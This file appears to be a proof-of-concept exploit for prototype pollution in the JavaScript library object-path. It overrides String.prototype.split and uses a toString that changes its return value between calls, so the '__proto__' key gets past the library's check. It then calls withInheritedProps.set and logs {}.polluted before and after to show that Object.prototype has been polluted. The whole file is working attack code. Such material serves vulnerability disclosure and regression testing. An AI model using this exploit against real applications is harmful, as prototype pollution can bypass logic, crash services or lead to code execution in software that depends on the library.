var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const objectPath = require('object-path');
console.log({}.polluted);
objectPath.withInheritedProps.set({}, [
    ['__proto__'],
    'polluted'
], 'yes');
console.log({}.polluted);